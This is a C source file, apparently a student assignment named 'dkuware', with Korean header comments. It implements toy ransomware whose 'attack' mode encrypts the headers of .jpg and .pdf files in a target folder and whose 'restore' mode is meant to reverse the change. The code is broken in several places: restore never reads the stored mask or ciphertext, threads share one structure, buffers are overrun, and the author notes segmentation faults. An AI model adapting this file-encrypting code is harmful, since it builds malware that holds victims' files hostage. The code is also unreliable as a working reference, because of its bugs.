// 학번: 32184893
// 학과: 모바일시스템공학과
// 이름: 한현민

// 해결한 부분
// - 파일 확장자 중 .jpg, .pdf 파일만 필터링
// - Semaphore 구조 적용 시도

// 해결 못 한 부분
// Semaphore 적용하였으나 일부만 암호화 / 복호화되며
// Segmentation fault 에러 발생

// 빌드 방법
// .o 파일 및 실행 파일 (./dkuware) 생성: 터미널을 압축 해제한 디렉토리에 위치해
// 놓은 상태에서 make all 입력 .o 파일 및 실행 파일 (./dkuware) 제거: 터미널을
// 압축 해제한 디렉토리에 위치해 놓은 상태에서 make clean 입력

// 실행 방법
// - ./target 디렉토리 파일 암호화: 터미널을 압축 해제한 디렉토리에 위치해 놓은
// 상태에서 ./dkuware attack <임의 키> 입력
// - ./target 디렉토리 파일 복호화: 터미널을 압축 해제한 디렉토리에 위치해 놓은
// 상태에서 ./dkuware restore <임의 키> 입력

#include "crypto.h"
#include "defines.h"
#include "threadpool.h"
#include "utils.h"

// =========== handles file directory ===========
// For counting file count to be saved in directory string array
static int pdfFileCount = 0;
char pdfList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
    {
        0,
    },
};

static int jpgFileCount = 0;
char jpgList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
    {
        0,
    },
};

int inputValidate(int argc, char *argv[]);

void readFileList();

void *passingJpgToSubmit(void *param);

void *passingPdfToSubmit(void *param);

// debug
// // =========== handles file encrpytion / decryption ===========
// static __thread int processed_pdf_count = 0;
// static __thread int processed_jpg_count = 0;

void *encryption_pdf(void *key);

void *encryption_jpg(void *key);

void *decryption_pdf(void *key);

void *decryption_jpg(void *key);

int main(int argc, char *argv[]) {
  if (!inputValidate(argc, argv)) {
    return -1;
  }

  char *fileHandleMode = argv[1];

  // save inputted password to key array
  unsigned char key[KEY_SIZE] = {
      0,
  };
  if (strlen(argv[2]) < KEY_SIZE) {
    for (int i = 0; i < strlen(argv[2]); i++) {
      key[i] = (unsigned char)(argv[2][i]);
    }
  } else {
    for (int i = 0; i < KEY_SIZE; i++) {
      key[i] = (unsigned char)(argv[2][i]);
    }
  }
  FILE_INFO info = {{
                        0,
                    },
                    -1,
                    -1,
                    {
                        0,
                    }};
  for (int i = 0; i < KEY_SIZE; i++) info.key[i] = key[i];

  readFileList();  // read all files in target directory and save their
                   // name into each string array "pdfList" and "jpgList"
                   // depending on its filetype

  // initalize the thread pool
  pool_init();

  // 파일 목록 읽기까지 끝났고 읽은 결과는 pdfList, jpgList에 들어가 있음
  // 그 다음은 스레드풀에 공격/복원 함수 및 파일명을 넘겨야 한다.
  // 스레드풀에 pool_submit을 통해 모두 넘겼으면 main 함수의 스레드들은 join
  // pool_submit(encryption_jpgs, ) -> 별도의 스레드를 하나 더 만들고 여기에다
  // 호출해야 함

  // making threads and run them
  pthread_t pdfHandleThread;
  pthread_attr_t pdfHandleThreadStatus;
  pthread_attr_init(&pdfHandleThreadStatus);

  pthread_t jpgHandleThread;
  pthread_attr_t jpgHandleThreadStatus;
  pthread_attr_init(&jpgHandleThreadStatus);

  if (strcmp(fileHandleMode, "attack") == 0) {
    info.action = ATTACK;
    pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, passingPdfToSubmit,
                   &info);
    pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, passingJpgToSubmit,
                   &info);

    pthread_join(pdfHandleThread, NULL);
    pthread_join(jpgHandleThread, NULL);

    printf("[attack] %d pdf files were encrypted\n", processed_pdf_count);
    printf("[attack] %d jpg files were encrypted\n", processed_jpg_count);

  } else if (strcmp(fileHandleMode, "restore") == 0) {
    info.action = RESTORE;
    pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, decryption_pdf,
                   &info);
    pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, decryption_jpg,
                   &info);

    pthread_join(pdfHandleThread, NULL);
    pthread_join(jpgHandleThread, NULL);

    printf("[restore] %d pdf files were decrypted\n", processed_pdf_count);
    printf("[restore] %d jpg files were decrypted\n", processed_jpg_count);
  }

  printAsciiArtOnDecryption();
  fflush(stdout);

  return 0;
}

int inputValidate(int argc, char *argv[]) {
  if (argc != 3) {
    printf("Error: Invalid Input\n");
    printf("Input example: <./filename> <attack/restore> <password>\n");
    return 0;
  }

  if (strcmp(argv[1], "attack") && strcmp(argv[1], "restore")) {
    printf("Error: Invalid Input\n");
    printf("Input example: <./filename> <attack/restore> <password>\n");
    return 0;
  }

  return 1;
}

void readFileList() {
  char command[BUF_SIZE] = "ls ./target";
  char fileItem[DIR_LENGTH] = {
      0,
  };

  char *fileTypeLower;  // .pdf, .jpg
  char *fileTypeUpper;  // .PDF, .JPG

  FILE *pipe = popen(command, "r");

  if (!pipe) {
    perror("Command execution error");
    return;
  } else {
    while (fscanf(pipe, "%s", fileItem) > 0) {
      // when fileCount exceeds maximum index of fileItem array, then
      // escape the loop statement.
      if (pdfFileCount >= MAX_FILE_AMOUNT || jpgFileCount >= MAX_FILE_AMOUNT) {
        break;
      }

      fileTypeLower = strstr(fileItem, ".pdf\0");
      if (fileTypeLower != NULL) {
        strcpy(pdfList[pdfFileCount++], fileItem);
        memset(fileItem, 0, BUF_SIZE);
        continue;
      }

      fileTypeUpper = strstr(fileItem, ".PDF\0");
      if (fileTypeUpper != NULL) {
        strcpy(pdfList[pdfFileCount++], fileItem);
        memset(fileItem, 0, BUF_SIZE);
        continue;
      }

      fileTypeLower = strstr(fileItem, ".jpg\0");
      if (fileTypeLower != NULL) {
        strcpy(jpgList[jpgFileCount++], fileItem);
      }

      fileTypeUpper = strstr(fileItem, ".JPG\0");
      if (fileTypeUpper != NULL) {
        strcpy(jpgList[jpgFileCount++], fileItem);
      }

      memset(fileItem, 0, BUF_SIZE);
    }
  }

  pclose(pipe);
}

void *passingJpgToSubmit(void *param) {
  // printf("[debug] before assigning to info\n");

  FILE_INFO *info = (FILE_INFO *)param;
  info->filetype = JPG;
  // printf("[debug] after info assigning\n");

  for (int i = 0; i < jpgFileCount; i++) {
    // printf("[debug] before strcpy\n");
    // printf("[debug] jpgList[%d]: %s, length: %d\n", i, jpgList[i],
    //        strlen(jpgList[i]));
    strcpy(info->filename, jpgList[i]);

    // printf("[debug] before pool_submit\n");

    if (info->action == ATTACK) {
      pool_submit(encryption_jpg, info);
    } else if (info->action == RESTORE) {
      pool_submit(decryption_jpg, info);
    }
  }

  return NULL;
}

void *passingPdfToSubmit(void *param) {
  FILE_INFO *info = (FILE_INFO *)param;
  info->filetype = PDF;

  for (int i = 0; i < pdfFileCount; i++) {
    strcpy(info->filename, pdfList[i]);

    if (info->action == ATTACK) {
      pool_submit(encryption_pdf, info);
    } else if (info->action == RESTORE) {
      pool_submit(decryption_pdf, info);
    }
  }

  return NULL;
}

void *encryption_pdf(void *param) {
  FILE_INFO *info = (FILE_INFO *)param;

  // open a single jpg file
  char *fileDir = (char *)malloc(sizeof(char) * BUF_SIZE);
  strcpy(fileDir, "./target/");
  strcat(fileDir, info->filename);
  FILE *fp = fopen(fileDir, "rb");

  // print message on terminal
  printf("[attack] %s\n", fileDir);

  // read browsed file by 16 bytes
  unsigned char *plainText =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(plainText, 0, FILE_HANDLE_BLOCK_SIZE);

  // get size value
  fread(plainText, 1, FILE_HANDLE_BLOCK_SIZE, fp);

  // generate mask randomly
  unsigned char *mask =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
  unsigned char segment[2] = {
      0,
  };
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    segment[0] = (unsigned char)rand();
    strcat(mask, segment);
    memset(segment, 0, 2);
  }

  // do XOR calculation on plainText with randomly generated mask
  unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
      0,
  };
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    cipherText[i] = plainText[i] ^ mask[i];
  }

  // overwrite cipherText on the head of target file
  FILE *overwrite_fp = fopen(fileDir, "r+b");
  fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
  fclose(overwrite_fp);

  // mask를 AES-128 알고리즘으로 암호화
  mask = aes_128_encryption(mask, info->key);

  // overwrite encrypted mask on the tail of target file
  overwrite_fp = fopen(fileDir, "ab");
  fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
  fclose(overwrite_fp);

  free(mask);
  free(plainText);
  fclose(fp);
  free(fileDir);

  processed_pdf_count++;

  return NULL;
}

void *encryption_jpg(void *param) {
  FILE_INFO *info = (FILE_INFO *)param;

  // open a single jpg file
  char *fileDir = (char *)malloc(sizeof(char) * BUF_SIZE);
  strcpy(fileDir, "./target/");
  strcat(fileDir, info->filename);
  FILE *fp = fopen(fileDir, "rb");

  // print message on terminal
  printf("[attack] %s\n", fileDir);

  // read browsed file by 16 bytes
  unsigned char *plainText =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(plainText, 0, FILE_HANDLE_BLOCK_SIZE);

  // get size value
  fread(plainText, 1, FILE_HANDLE_BLOCK_SIZE, fp);

  // generate mask randomly
  unsigned char *mask =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
  unsigned char segment[2] = {
      0,
  };
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    segment[0] = (unsigned char)rand();
    strcat(mask, segment);
    memset(segment, 0, 2);
  }

  // do XOR calculation on plainText with randomly generated mask
  unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
      0,
  };
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    cipherText[i] = plainText[i] ^ mask[i];
  }

  // overwrite cipherText on the head of target file
  FILE *overwrite_fp = fopen(fileDir, "r+b");
  fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
  fclose(overwrite_fp);

  // mask를 AES-128 알고리즘으로 암호화
  mask = aes_128_encryption(mask, info->key);

  // overwrite encrypted mask on the tail of target file
  overwrite_fp = fopen(fileDir, "ab");
  fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
  fclose(overwrite_fp);

  free(mask);
  free(plainText);
  fclose(fp);
  free(fileDir);

  processed_jpg_count++;

  return NULL;
}

void *decryption_pdf(void *param) {
  FILE_INFO *info = (FILE_INFO *)param;

  // open a single jpg file
  char *fileDir = (char *)malloc(sizeof(char) * BUF_SIZE);
  strcpy(fileDir, "./target/");
  strcat(fileDir, info->filename);
  FILE *payload_fp = fopen(fileDir, "rb");
  FILE *mask_fp = fopen(fileDir, "rb");
  fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);

  // print message on terminal
  printf("[restore] %s\n", fileDir);

  // read browsed file by 16 bytes
  unsigned char *cipherText =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(cipherText, 0, FILE_HANDLE_BLOCK_SIZE);

  // read browsed file by 16 bytes
  unsigned char *mask =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);

  mask = aes_128_decryption(mask, info->key);

  // do XOR calculation on plainText with randomly generated mask
  unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
      0,
  };
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    plainText[i] = cipherText[i] ^ mask[i];
  }

  // write plainText in the head of file
  fclose(payload_fp);
  payload_fp = fopen(fileDir, "r+b");
  fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);

  // erase mask in the tail of file
  fclose(mask_fp);
  mask_fp = fopen(fileDir, "r+b");
  fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
  char eraser[1] = {'\0'};
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
  }

  free(mask);
  free(cipherText);
  fclose(mask_fp);
  fclose(payload_fp);
  free(fileDir);

  processed_pdf_count++;

  return NULL;
}

void *decryption_jpg(void *param) {
  FILE_INFO *info = (FILE_INFO *)param;

  // open a single jpg file
  char *fileDir = (char *)malloc(sizeof(char) * BUF_SIZE);
  strcpy(fileDir, "./target/");
  strcat(fileDir, info->filename);
  FILE *payload_fp = fopen(fileDir, "rb");
  FILE *mask_fp = fopen(fileDir, "rb");
  fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);

  // print message on terminal
  printf("[restore] %s\n", fileDir);

  // read browsed file by 16 bytes
  unsigned char *cipherText =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(cipherText, 0, FILE_HANDLE_BLOCK_SIZE);

  // read browsed file by 16 bytes
  unsigned char *mask =
      (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
  memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);

  mask = aes_128_decryption(mask, info->key);

  // do XOR calculation on plainText with randomly generated mask
  unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
      0,
  };
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    plainText[i] = cipherText[i] ^ mask[i];
  }

  // write plainText in the head of file
  fclose(payload_fp);
  payload_fp = fopen(fileDir, "r+b");
  fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);

  // erase mask in the tail of file
  fclose(mask_fp);
  mask_fp = fopen(fileDir, "r+b");
  fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
  char eraser[1] = {'\0'};
  for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
    fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
  }

  free(mask);
  free(cipherText);
  fclose(mask_fp);
  fclose(payload_fp);
  free(fileDir);

  processed_jpg_count++;

  return NULL;
}